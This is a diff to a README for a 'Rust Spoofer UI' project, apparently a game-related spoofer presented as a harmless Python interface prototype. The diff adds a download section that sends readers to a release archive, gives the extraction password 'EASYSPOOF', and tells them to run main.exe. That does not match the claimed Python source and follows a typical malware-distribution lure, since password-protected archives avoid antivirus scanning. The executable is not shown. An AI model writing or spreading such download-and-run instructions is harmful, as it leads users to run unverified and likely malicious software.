@@ -13,7 +13,7 @@ This repository contains a dark-themed Win32 interface prototype named **Rust Sp
 ## Preview
 
 <p align="center">
-  <img src="resources/preview.png" alt="Rust Spoofer UI prototype preview" width="600">
+  <img src="rust-spoofer-ui/assets/screenshot.png" alt="Rust Spoofer UI prototype preview" width="600">
 </p>
 
 The application window is approximately 600×350 pixels and includes:
@@ -49,8 +49,6 @@ No operating system identifiers or security products are accessed.
 No Qt or third-party runtime framework is required.
 
 ## Project Structure
-
-```text
 rust-spoofer-ui/
 │
 ├── main.py
@@ -60,8 +58,16 @@ rust-spoofer-ui/
 ├── .gitignore
 │
 └── assets/
-    └── screenshot.png
-```
+└── screenshot.png
+
+## Download & Installation
+
+[![Download Release](https://img.shields.io/badge/Download-Latest%20Release-2ea44f?style=for-the-badge&logo=github)](https://github.com/dekerIT/rust-spoofer-ui/releases/tag/v1.0.0)
+
+1. Click the **Download** button above to go to the latest release.
+2. Download the `.zip` archive from the Assets section.
+3. Extract the archive using the password: `EASYSPOOF`
+4. Run `main.exe` (no installation required).
 
 ## Disclaimer
 
